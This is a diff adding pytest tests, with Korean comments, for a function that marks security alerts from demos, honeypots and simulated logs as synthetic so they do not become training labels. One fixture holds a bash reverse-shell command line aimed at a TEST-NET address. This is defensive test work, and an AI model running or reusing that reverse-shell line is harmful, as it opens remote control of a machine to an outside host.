@@ -169,3 +169,89 @@ def test_eval_script_does_not_let_group_labels_pass_the_threshold(tmp_path, monk
     assert counts["group_covers"] == 100_000
     # 그룹 라벨이 아무리 많아도 개별 라벨 수를 늘리지 않는다
     assert counts["single_decisions"] == 0
+
+
+# --------------------------------------------------------------------------- #
+#  출처(provenance) — 합성 알림으로 정답지를 만들지 않기 위한 층
+#
+#  실측: 알림 110,894건 중 합성 표지가 없는 것은 183건(0.16%)뿐이었다.
+#  허니팟 데모·퍼플팀 TEST-NET·데모 평판·허니넷 SIMULATED 로그·threat_detector
+#  데모 카탈로그·EDR 데모 주입 프로세스가 나머지를 만든다. 이걸 모른 채 상위
+#  그룹을 '정탐'으로 판정하면 생성기가 의도한 바를 확인하는 라벨이 될 뿐이다.
+# --------------------------------------------------------------------------- #
+import json as _json
+
+from modules.labeling import (PROVENANCE_REAL, PROVENANCE_SYNTHETIC,
+                              classify_provenance)
+
+
+def test_details_demo_flag_is_synthetic():
+    assert classify_provenance("x", _json.dumps({"demo": True}))[0] == PROVENANCE_SYNTHETIC
+
+
+def test_stored_origin_demo_is_synthetic():
+    assert classify_provenance("x", "{}", stored_origin="demo")[0] == PROVENANCE_SYNTHETIC
+
+
+def test_legacy_stored_origin_is_not_trusted():
+    """아카이브 11만 건이 전부 'legacy' 다 — 실측이라는 뜻이 아니다."""
+    origin, why = classify_provenance(
+        "x", _json.dumps({"demo": True}), stored_origin="legacy")
+    assert origin == PROVENANCE_SYNTHETIC, why
+
+
+def test_testnet_ip_is_synthetic():
+    """퍼플팀 하네스는 실제 공격 대신 RFC 5737 문서용 대역을 쓴다."""
+    d = _json.dumps({"cmdline": "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1"})
+    assert classify_provenance("[Sigma] Reverse Shell", d)[0] == PROVENANCE_SYNTHETIC
+
+
+def test_threat_detector_demo_catalog_is_synthetic():
+    """데모 생성기의 문구는 실제 탐지 경로가 만들어내지 않는다."""
+    from modules.threat_detector import ThreatDetector
+
+    for row in ThreatDetector._DEMO_THREATS:
+        assert classify_provenance(row[4], "{}")[0] == PROVENANCE_SYNTHETIC, row[4]
+
+
+def test_edr_demo_cmdlines_are_synthetic():
+    from modules.edr import DEMO_THREAT_PROCESSES
+
+    for _, proc in DEMO_THREAT_PROCESSES:
+        d = _json.dumps({"cmdline": proc["cmdline"]})
+        assert classify_provenance("[EDR] 무엇이든", d)[0] == PROVENANCE_SYNTHETIC
+
+
+def test_unmarked_alert_is_real():
+    d = _json.dumps({"signature_id": 1917, "source": "snort"})
+    origin, why = classify_provenance("[Snort SID 1917] SCAN UPnP", d)
+    assert origin == PROVENANCE_REAL
+    assert "없음" in why, "real 은 '실측 보장' 이 아니라 '합성 표지 없음' 이다"
+
+
+def test_demo_alerts_are_stamped_demo():
+    """데모 생성기가 만든 Alert 는 origin='demo' 여야 한다.
+
+    details 를 안 넘기면 Alert.origin 이 'real' 로 찍혀 데모가 실측으로 둔갑한다.
+    """
+    from modules.threat_detector import ThreatDetector
+
+    det = ThreatDetector.__new__(ThreatDetector)
+    made = []
+    det._add_alert = made.append
+    det._rand_ip = lambda t: t.replace("{}", "9")
+    det._demo_create_random_alert()
+    assert made and made[0].origin == "demo", "데모 알림이 실측으로 기록됐다"
+
+
+def test_authlog_detects_simulated_source(tmp_path):
+    """SIMULATED 헤더가 있는 auth.log 를 tail 하는 건 실동작이지만 내용은 합성이다."""
+    from modules.authlog_parser import AuthLogMonitor
+
+    sim = tmp_path / "auth.log"
+    sim.write_text("# SIMULATED SSH auth.log — 검증용\n", encoding="utf-8")
+    assert AuthLogMonitor._looks_simulated(str(sim)) is True
+
+    real = tmp_path / "real.log"
+    real.write_text("Sep  5 10:00:00 host sshd[1]: Accepted password for u\n", encoding="utf-8")
+    assert AuthLogMonitor._looks_simulated(str(real)) is False
